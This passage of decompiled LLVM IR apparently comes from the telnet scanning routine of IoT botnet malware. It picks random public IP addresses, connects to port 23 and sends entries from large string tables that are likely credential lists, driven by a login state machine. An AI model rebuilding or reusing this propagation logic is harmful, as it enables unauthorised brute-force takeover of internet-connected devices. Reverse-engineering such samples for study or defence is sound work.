  store i32 %v2_b3f0, i32* %r3.global-to-local, align 4
  %v1_b3f4 = inttoptr i32 %v2_b3f0 to i32*
  %v2_b3f4 = load i32, i32* %v1_b3f4, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b418 = inttoptr i32 %v2_b30c to i32*
  store i32 0, i32* %v2_b418, align 4
  %v0_b41c = load i32, i32* %r3.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 4
  store i32 %v1_b41c, i32* %r3.global-to-local, align 4
  %v2_b424 = inttoptr i32 %v1_b41c to i32*
  store i32 0, i32* %v2_b424, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = add i32 %v0_b428, 4
  store i32 %v1_b428, i32* %r3.global-to-local, align 4
  %v2_b430 = inttoptr i32 %v1_b428 to i32*
  store i32 0, i32* %v2_b430, align 4
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 4
  store i32 %v1_b434, i32* %r3.global-to-local, align 4
  %v2_b43c = inttoptr i32 %v1_b434 to i32*
  store i32 0, i32* %v2_b43c, align 4
  %v0_b440 = load i32, i32* %r3.global-to-local, align 4
  %v1_b440 = add i32 %v0_b440, 4
  store i32 %v1_b440, i32* %r3.global-to-local, align 4
  %v2_b448 = inttoptr i32 %v1_b440 to i32*
  store i32 0, i32* %v2_b448, align 4
  %v0_b44c = load i32, i32* %r3.global-to-local, align 4
  %v1_b44c = add i32 %v0_b44c, 4
  store i32 %v1_b44c, i32* %r3.global-to-local, align 4
  %v2_b454 = inttoptr i32 %v1_b44c to i32*
  store i32 0, i32* %v2_b454, align 4
  %v0_b458 = load i32, i32* %r3.global-to-local, align 4
  %v1_b458 = add i32 %v0_b458, 4
  %v2_b460 = inttoptr i32 %v1_b458 to i32*
  store i32 0, i32* %v2_b460, align 4
  store i32 %v2_b3f0, i32* %r2.global-to-local, align 4
  store i32 %v2_b3f4, i32* %r3.global-to-local, align 4
  store i32 %v2_b3f4, i32* %v1_b3f4, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_b490 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b1a4, i32 %v2_b3f0, i32 %v2_b3f4, i32 %v2_b3f4)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r4, align 4
  %v3_b4a4 = mul i32 %v0_b4a0, 4
  store i32 %v3_b4a4, i32* %r2.global-to-local, align 4
  %v2_b4ac = mul i32 %v0_b4a0, 28
  %v2_b4b4 = add i32 %v2_b5f4, %v2_b4ac
  store i32 %v2_b4b4, i32* %r3.global-to-local, align 4
  %v2_b4b8 = inttoptr i32 %v2_b4b4 to i32*
  store i32 %v5_b490, i32* %v2_b4b8, align 4
  br label %dec_label_pc_b59c

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b3a8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v3_b4e0 = load i8, i8* %v2_b3c8, align 1
  %v4_b4e0 = zext i8 %v3_b4e0 to i32
  store i32 %v4_b4e0, i32* %r3.global-to-local, align 4
  %v2_b4e4 = icmp eq i8 %v3_b4e0, 0
  br i1 %v2_b4e4, label %dec_label_pc_b4ec, label %dec_label_pc_b59c

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4c0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v1_b510 = add i32 %v2_b30c, 11
  %v2_b510 = inttoptr i32 %v1_b510 to i8*
  %v3_b510 = load i8, i8* %v2_b510, align 1
  %v1_b514 = add i8 %v3_b510, 1
  store i8 %v1_b514, i8* %v2_b510, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r3.global-to-local, align 4
  %v1_b568 = add i32 %v2_b30c, 10
  %v2_b568 = inttoptr i32 %v1_b568 to i8*
  %v3_b568 = load i8, i8* %v2_b568, align 2
  %v4_b568 = zext i8 %v3_b568 to i32
  %v1_b56c = add nuw nsw i32 %v4_b568, 1
  %v1_b570 = urem i32 %v1_b56c, 256
  store i32 %v3_b1a4, i32* %ip.global-to-local, align 4
  store i32 %v2_b3c4, i32* %r2.global-to-local, align 4
  store i32 %v1_b570, i32* %r3.global-to-local, align 4
  %v1_b598 = trunc i32 %v1_b56c to i8
  store i8 %v1_b598, i8* %v2_b568, align 2
  br label %dec_label_pc_b59c

dec_label_pc_b59c:                                ; preds = %dec_label_pc_b4c0, %dec_label_pc_b3d4, %dec_label_pc_b4ec
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b5b0 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b5f8 = add i32 %v2_b5f4, %v2_b308
  store i32 %v2_b5f8, i32* %r3.global-to-local, align 4
  %v1_b5fc = inttoptr i32 %v2_b5f8 to i32*
  %v2_b5fc = load i32, i32* %v1_b5fc, align 4
  store i32 %v2_b5fc, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_b614 = call i32 @socket()
  %v0_b61c = load i32, i32* @r4, align 4
  %v2_b628 = mul i32 %v0_b61c, 28
  %v2_b62c = add i32 %v2_b628, %v3_b1a4
  %v2_b630 = inttoptr i32 %v2_b62c to i32*
  store i32 %v0_b614, i32* %v2_b630, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_b64c = inttoptr i32 %v2_b30c to i32*
  %v2_b64c = load i32, i32* %v1_b64c, align 4
  store i32 %v2_b64c, i32* %r3.global-to-local, align 4
  %v7_b650 = icmp eq i32 %v2_b64c, -1
  br i1 %v7_b650, label %dec_label_pc_c3c8, label %dec_label_pc_b658

dec_label_pc_b658:                                ; preds = %dec_label_pc_b59c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b670 = load i32, i32* %v1_b64c, align 4
  store i32 %v2_b670, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b68c = load i32, i32* %v1_b64c, align 4
  store i32 %v2_b68c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b69c = call i32 @__libc_fcntl(i32 %v2_b68c, i32 3)
  %v1_b6a4 = or i32 %v2_b69c, 2048
  store i32 %v1_b6a4, i32* %r3.global-to-local, align 4
  %v0_b6a8 = load i32, i32* @r4, align 4
  store i32 %v1_b6a4, i32* @r2, align 4
  %v2_b6b4 = call i32 @__libc_fcntl(i32 %v0_b6a8, i32 4)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b6d0 = load i32, i32* %v1_b64c, align 4
  store i32 %v2_b6d0, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_b6e4 = call i32 @__libc_connect(i32 %v2_b6d0, %sockaddr* nonnull %v3_b6e4, i32 16)
  store i32 %v4_b6e4, i32* %r3.global-to-local, align 4
  %v3_b6ec = icmp eq i32 %v4_b6e4, -1
  br i1 %v3_b6ec, label %dec_label_pc_b6f4, label %dec_label_pc_b72c

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b658
  %v0_b6f4 = call i32 @__errno_location()
  store i32 %v0_b6f4, i32* %r3.global-to-local, align 4
  %v1_b6fc = inttoptr i32 %v0_b6f4 to i32*
  %v2_b6fc = load i32, i32* %v1_b6fc, align 4
  store i32 %v2_b6fc, i32* %r3.global-to-local, align 4
  %v7_b700 = icmp eq i32 %v2_b6fc, 115
  br i1 %v7_b700, label %dec_label_pc_b72c, label %dec_label_pc_b708

dec_label_pc_b708:                                ; preds = %dec_label_pc_b6f4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b724 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b658, %dec_label_pc_b6f4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b74c = call i32 @advance_state(i32* nonnull %v1_b64c, i32 1)
  br label %dec_label_pc_c3c8

dec_label_pc_b768.lr.ph:                          ; preds = %dec_label_pc_b358
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b768.lr.ph, %dec_label_pc_b768
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b768.lr.ph ], [ %v1_b77c, %dec_label_pc_b768 ]
  store i32 %v2_b754, i32* %r2.global-to-local, align 4
  %v5_b774 = mul nuw nsw i32 %storemerge610, 4
  %v6_b774 = add i32 %v5_b774, %v2_b754
  %v7_b774 = inttoptr i32 %v6_b774 to i32*
  store i32 0, i32* %v7_b774, align 4
  %v1_b77c = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_b77c, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_b77c, 32
  br i1 %tmp43, label %dec_label_pc_b768, label %dec_label_pc_b790

dec_label_pc_b790:                                ; preds = %dec_label_pc_b768
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_b7a8 = inttoptr i32 %v2_b30c to i32*
  %v2_b7a8 = load i32, i32* %v1_b7a8, align 4
  %v3_b7ac = udiv i32 %v2_b7a8, 32
  %v3_b7c0 = mul nuw nsw i32 %v3_b7ac, 4
  %v2_b7c8 = add i32 %v3_b7c0, %v19_b0bc
  store i32 %v2_b7c8, i32* %r2.global-to-local, align 4
  %v2_b7cc = add i32 %v2_b7c8, -300
  store i32 %v2_b7cc, i32* %r3.global-to-local, align 4
  %v1_b7d0 = inttoptr i32 %v2_b7cc to i32*
  %v2_b7d0 = load i32, i32* %v1_b7d0, align 4
  store i32 %v2_b7d0, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* %v1_b7a8, align 4
  %v1_b7f0 = urem i32 %v2_b7ec, 32
  %v6_b7f8 = shl i32 1, %v1_b7f0
  %v2_b7fc = or i32 %v6_b7f8, %v2_b7d0
  store i32 %v2_b7fc, i32* %v1_b7d0, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b844 = load i32, i32* %v1_b7a8, align 4
  %v1_b848 = add i32 %v2_b844, 1
  store i32 %v1_b848, i32* %r2.global-to-local, align 4
  store i32 %v2_b754, i32* %ip.global-to-local, align 4
  %v1_b854 = load i32, i32* @sp, align 4
  %v2_b854 = inttoptr i32 %v1_b854 to i32*
  store i32 %v2_b850, i32* %v2_b854, align 4
  %v0_b858 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b754, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_b868 = load i32, i32* %stack_var_-332, align 4
  %v5_b868 = call i32 @__libc_select(i32 %v0_b858, i32 0, i32 %v2_b754, i32 0, i32 %v4_b868)
  store i32 %v5_b868, i32* %r3.global-to-local, align 4
  %v7_b878 = icmp eq i32 %v5_b868, 1
  br i1 %v7_b878, label %dec_label_pc_b880, label %dec_label_pc_b984

dec_label_pc_b880:                                ; preds = %dec_label_pc_b790
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b8a8 = load i32, i32* %v1_b7a8, align 4
  store i32 %v2_b8a8, i32* %r2.global-to-local, align 4
  store i32 %v2_b8ac, i32* %ip.global-to-local, align 4
  %v1_b8b4 = load i32, i32* @sp, align 4
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i32*
  store i32 %v2_b8b0, i32* %v2_b8b4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_b8ac, i32* %r3.global-to-local, align 4
  %v0_b8c8 = call i32 @getsockopt()
  %v3_b8cc = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_b8cc, i32* %r3.global-to-local, align 4
  %v2_b8d0 = icmp eq i32 %v3_b8cc, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  br i1 %v2_b8d0, label %dec_label_pc_b8fc, label %dec_label_pc_b8d8

dec_label_pc_b8d8:                                ; preds = %dec_label_pc_b880
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b8f4 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_b8fc:                                ; preds = %dec_label_pc_b880
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b914 = load i32, i32* %v1_b7a8, align 4
  store i32 %v2_b914, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b930 = load i32, i32* %v1_b7a8, align 4
  store i32 %v2_b930, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b940 = call i32 @__libc_fcntl(i32 %v2_b930, i32 3)
  %v1_b948 = and i32 %v2_b940, -2049
  store i32 %v1_b948, i32* %r3.global-to-local, align 4
  %v0_b94c = load i32, i32* @r4, align 4
  store i32 %v1_b948, i32* @r2, align 4
  %v2_b958 = call i32 @__libc_fcntl(i32 %v0_b94c, i32 4)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b97c = call i32 @advance_state(i32* nonnull %v1_b7a8, i32 2)
  br label %dec_label_pc_c3c8

dec_label_pc_b984:                                ; preds = %dec_label_pc_b790
  store i32 %v5_b868, i32* %r3.global-to-local, align 4
  %v3_b988 = icmp eq i32 %v5_b868, -1
  br i1 %v3_b988, label %dec_label_pc_b990, label %dec_label_pc_b9b4

dec_label_pc_b990:                                ; preds = %dec_label_pc_b984
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b9ac = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_b9b4:                                ; preds = %dec_label_pc_b984
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_b9d0 = add i32 %v2_b308, %v2_b9cc
  store i32 %v2_b9d0, i32* %r3.global-to-local, align 4
  %v1_b9d4 = inttoptr i32 %v2_b9d0 to i32*
  %v2_b9d4 = load i32, i32* %v1_b9d4, align 4
  store i32 %v2_b9d4, i32* %r3.global-to-local, align 4
  %v1_b9d8 = add i32 %v2_b9d4, 5
  store i32 %v1_b9d8, i32* @r4, align 4
  %v2_b9e0 = call i32 @__GI_time(i32* null)
  store i32 %v2_b9e0, i32* %r3.global-to-local, align 4
  %v0_b9e8 = load i32, i32* @r4, align 4
  %v3_b9e8 = icmp ult i32 %v0_b9e8, %v2_b9e0
  br i1 %v3_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_c3c8

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9b4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_ba0c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_ba14:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_ba2c = inttoptr i32 %v2_b30c to i32*
  %v2_ba2c = load i32, i32* %v1_ba2c, align 4
  store i32 %v2_ba2c, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_ba4c = add i32 %v2_b308, %v2_ba48
  store i32 %v2_ba4c, i32* %r3.global-to-local, align 4
  %v1_ba50 = inttoptr i32 %v2_ba4c to i32*
  %v2_ba50 = load i32, i32* %v1_ba50, align 4
  store i32 %v2_ba50, i32* %r2.global-to-local, align 4
  %v1_ba58 = load i32, i32* @sp, align 4
  %v2_ba58 = inttoptr i32 %v1_ba58 to i32*
  store i32 ptrtoint (i32* @global_var_23d78 to i32), i32* %v2_ba58, align 4
  %v0_ba5c = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_ba68 = inttoptr i32 %v2_ba50 to i8*
  %v5_ba68 = call i32 @read_until_response(i32 %v0_ba5c, i32 %arg1, i8* %v4_ba68, i32 1024)
  %v2_ba70 = icmp eq i32 %v5_ba68, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_ba70, label %dec_label_pc_bb00, label %dec_label_pc_ba78

dec_label_pc_ba78:                                ; preds = %dec_label_pc_ba14
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_ba94 = add i32 %v2_b30c, 24
  store i32 %v2_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = inttoptr i32 %v2_ba94 to i32*
  %v2_ba98 = load i32, i32* %v1_ba98, align 4
  store i32 %v2_ba98, i32* %r3.global-to-local, align 4
  %v1_baa0 = call i32 @contains_fail(i32 %v2_ba98)
  %v2_baa8 = icmp eq i32 %v1_baa0, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v2_baa8, label %dec_label_pc_bad8, label %dec_label_pc_bab0

dec_label_pc_bab0:                                ; preds = %dec_label_pc_ba78
  %v3_bad0 = call i32 @advance_state(i32* %v1_ba2c, i32 0)
  br label %dec_label_pc_c3c8

dec_label_pc_bad8:                                ; preds = %dec_label_pc_ba78
  %v3_baf8 = call i32 @advance_state(i32* %v1_ba2c, i32 3)
  br label %dec_label_pc_c3c8

dec_label_pc_bb00:                                ; preds = %dec_label_pc_ba14
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b310, i32* %r3.global-to-local, align 4
  %v2_bb20 = load i32, i32* %v1_b314, align 4
  store i32 %v2_bb20, i32* %r3.global-to-local, align 4
  %v1_bb24 = add i32 %v2_bb20, 7
  store i32 %v1_bb24, i32* @r4, align 4
  %v2_bb2c = call i32 @__GI_time(i32* null)
  store i32 %v2_bb2c, i32* %r3.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  %v3_bb34 = icmp ult i32 %v0_bb34, %v2_bb2c
  br i1 %v3_bb34, label %dec_label_pc_bb3c, label %dec_label_pc_c3c8

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb00
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_bb58 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_bb60:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_bb78 = inttoptr i32 %v2_b30c to i32*
  %v2_bb78 = load i32, i32* %v1_bb78, align 4
  store i32 %v2_bb78, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bb98 = add i32 %v2_b30c, 8
  store i32 %v2_bb98, i32* %r3.global-to-local, align 4
  %v1_bb9c = add i32 %v2_b30c, 10
  %v2_bb9c = inttoptr i32 %v1_bb9c to i8*
  %v3_bb9c = load i8, i8* %v2_bb9c, align 2
  %v4_bb9c = zext i8 %v3_bb9c to i32
  store i32 %v4_bb9c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([769 x i8*]* @global_var_23144.369 to i32), i32* %r3.global-to-local, align 4
  %v4_bba8 = mul nuw nsw i32 %v4_bb9c, 4
  %v5_bba8 = add i32 %v4_bba8, ptrtoint ([769 x i8*]* @global_var_23144.369 to i32)
  %v6_bba8 = inttoptr i32 %v5_bba8 to i32*
  %v7_bba8 = load i32, i32* %v6_bba8, align 4
  store i32 %v7_bba8, i32* @r5, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_bb98, i32* %r3.global-to-local, align 4
  %v3_bbcc = load i8, i8* %v2_bb9c, align 2
  %v4_bbcc = zext i8 %v3_bbcc to i32
  store i32 %v4_bbcc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([769 x i8*]* @global_var_23144.369 to i32), i32* %r3.global-to-local, align 4
  %v4_bbd8 = mul nuw nsw i32 %v4_bbcc, 4
  %v5_bbd8 = add i32 %v4_bbd8, ptrtoint ([769 x i8*]* @global_var_23144.369 to i32)
  %v6_bbd8 = inttoptr i32 %v5_bbd8 to i32*
  %v7_bbd8 = load i32, i32* %v6_bbd8, align 4
  store i32 %v7_bbd8, i32* %r3.global-to-local, align 4
  %v1_bbdc = inttoptr i32 %v7_bbd8 to i8*
  %v3_bbe0 = call i32 @strlen(i8* %v1_bbdc)
  %v0_bbe8 = load i32, i32* @r4, align 4
  %v0_bbec = load i32, i32* @r5, align 4
  store i32 %v3_bbe0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bbf8 = inttoptr i32 %v0_bbec to i32*
  %v5_bbf8 = call i32 @__libc_send(i32 %v0_bbe8, i32* %v4_bbf8, i32 %v3_bbe0, i32 16384)
  %v1_bc00 = icmp slt i32 %v5_bbf8, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bc00, label %dec_label_pc_bc08, label %dec_label_pc_bc2c

dec_label_pc_bc08:                                ; preds = %dec_label_pc_bb60
  %v3_bc24 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bb60
  %v2_bc44 = load i32, i32* %v1_bb78, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bc58 = call i32 @__libc_send(i32 %v2_bc44, i32* bitcast ([3 x i8]* @global_var_193f4.371 to i32*), i32 2, i32 16384)
  %v1_bc60 = icmp slt i32 %v6_bc58, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bc60, label %dec_label_pc_bc68, label %dec_label_pc_bc8c

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bc2c
  %v3_bc84 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_bc8c:                                ; preds = %dec_label_pc_bc2c
  %v3_bcac = call i32 @advance_state(i32* nonnull %v1_bb78, i32 4)
  br label %dec_label_pc_c3c8

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_bccc = inttoptr i32 %v2_b30c to i32*
  %v2_bccc = load i32, i32* %v1_bccc, align 4
  store i32 %v2_bccc, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bcec = add i32 %v2_b308, %v2_ba48
  store i32 %v2_bcec, i32* %r3.global-to-local, align 4
  %v1_bcf0 = inttoptr i32 %v2_bcec to i32*
  %v2_bcf0 = load i32, i32* %v1_bcf0, align 4
  store i32 %v2_bcf0, i32* %r2.global-to-local, align 4
  %v1_bcf8 = load i32, i32* @sp, align 4
  %v2_bcf8 = inttoptr i32 %v1_bcf8 to i32*
  store i32 ptrtoint (i32* @global_var_23d78 to i32), i32* %v2_bcf8, align 4
  %v0_bcfc = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bd08 = inttoptr i32 %v2_bcf0 to i8*
  %v5_bd08 = call i32 @read_until_response(i32 %v0_bcfc, i32 %arg1, i8* %v4_bd08, i32 1024)
  %v2_bd10 = icmp eq i32 %v5_bd08, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bd10, label %dec_label_pc_bda0, label %dec_label_pc_bd18

dec_label_pc_bd18:                                ; preds = %dec_label_pc_bcb4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bd34 = add i32 %v2_b30c, 24
  store i32 %v2_bd34, i32* %r3.global-to-local, align 4
  %v1_bd38 = inttoptr i32 %v2_bd34 to i32*
  %v2_bd38 = load i32, i32* %v1_bd38, align 4
  store i32 %v2_bd38, i32* %r3.global-to-local, align 4
  %v1_bd40 = call i32 @contains_fail(i32 %v2_bd38)
  %v2_bd48 = icmp eq i32 %v1_bd40, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v2_bd48, label %dec_label_pc_bd78, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd18
  %v3_bd70 = call i32 @advance_state(i32* %v1_bccc, i32 0)
  br label %dec_label_pc_c3c8

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bd18
  %v3_bd98 = call i32 @advance_state(i32* %v1_bccc, i32 5)
  br label %dec_label_pc_c3c8

dec_label_pc_bda0:                                ; preds = %dec_label_pc_bcb4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b310, i32* %r3.global-to-local, align 4
  %v2_bdc0 = load i32, i32* %v1_b314, align 4
  store i32 %v2_bdc0, i32* %r3.global-to-local, align 4
  %v1_bdc4 = add i32 %v2_bdc0, 3
  store i32 %v1_bdc4, i32* @r4, align 4
  %v2_bdcc = call i32 @__GI_time(i32* null)
  store i32 %v2_bdcc, i32* %r3.global-to-local, align 4
  %v0_bdd4 = load i32, i32* @r4, align 4
  %v3_bdd4 = icmp ult i32 %v0_bdd4, %v2_bdcc
  br i1 %v3_bdd4, label %dec_label_pc_bddc, label %dec_label_pc_c3c8

dec_label_pc_bddc:                                ; preds = %dec_label_pc_bda0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_bdf8 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_be00:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_be18 = inttoptr i32 %v2_b30c to i32*
  %v2_be18 = load i32, i32* %v1_be18, align 4
  store i32 %v2_be18, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_be38 = add i32 %v2_b30c, 8
  store i32 %v2_be38, i32* %r3.global-to-local, align 4
  %v1_be3c = add i32 %v2_b30c, 11
  %v2_be3c = inttoptr i32 %v1_be3c to i8*
  %v3_be3c = load i8, i8* %v2_be3c, align 1
  %v4_be3c = zext i8 %v3_be3c to i32
  store i32 %v4_be3c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([334 x i8*]* @global_var_23810.373 to i32), i32* %r3.global-to-local, align 4
  %v4_be48 = mul nuw nsw i32 %v4_be3c, 4
  %v5_be48 = add i32 %v4_be48, ptrtoint ([334 x i8*]* @global_var_23810.373 to i32)
  %v6_be48 = inttoptr i32 %v5_be48 to i32*
  %v7_be48 = load i32, i32* %v6_be48, align 4
  store i32 %v7_be48, i32* @r5, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_be38, i32* %r3.global-to-local, align 4
  %v3_be6c = load i8, i8* %v2_be3c, align 1
  %v4_be6c = zext i8 %v3_be6c to i32
  store i32 %v4_be6c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([334 x i8*]* @global_var_23810.373 to i32), i32* %r3.global-to-local, align 4
  %v4_be78 = mul nuw nsw i32 %v4_be6c, 4
  %v5_be78 = add i32 %v4_be78, ptrtoint ([334 x i8*]* @global_var_23810.373 to i32)
  %v6_be78 = inttoptr i32 %v5_be78 to i32*
  %v7_be78 = load i32, i32* %v6_be78, align 4
  store i32 %v7_be78, i32* %r3.global-to-local, align 4
  %v1_be7c = inttoptr i32 %v7_be78 to i8*
  %v3_be80 = call i32 @strlen(i8* %v1_be7c)
  %v0_be88 = load i32, i32* @r4, align 4
  %v0_be8c = load i32, i32* @r5, align 4
  store i32 %v3_be80, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_be98 = inttoptr i32 %v0_be8c to i32*
  %v5_be98 = call i32 @__libc_send(i32 %v0_be88, i32* %v4_be98, i32 %v3_be80, i32 16384)
  %v1_bea0 = icmp slt i32 %v5_be98, 0
